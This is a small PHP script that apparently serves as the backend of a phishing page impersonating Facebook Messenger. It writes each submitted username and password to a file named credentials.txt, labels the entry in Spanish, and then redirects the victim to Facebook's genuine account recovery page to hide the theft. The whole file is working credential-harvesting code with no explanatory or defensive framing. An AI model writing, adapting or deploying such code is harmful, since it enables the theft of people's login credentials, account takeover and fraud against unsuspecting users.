<?php

file_put_contents("credentials.txt", "[+] Messenger -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com/recover/initiate/');
exit();
?>
